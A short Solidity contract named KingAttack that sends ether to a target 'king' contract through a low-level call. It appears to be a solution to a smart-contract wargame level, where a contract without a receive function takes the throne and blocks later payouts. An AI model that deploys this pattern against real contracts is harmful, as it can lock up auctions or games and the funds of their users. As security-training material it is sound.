// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    function attack(address kingAddress) public payable returns (bool) {
	(bool success, ) = kingAddress.call{value: msg.value}("");
	return success;
    }
}
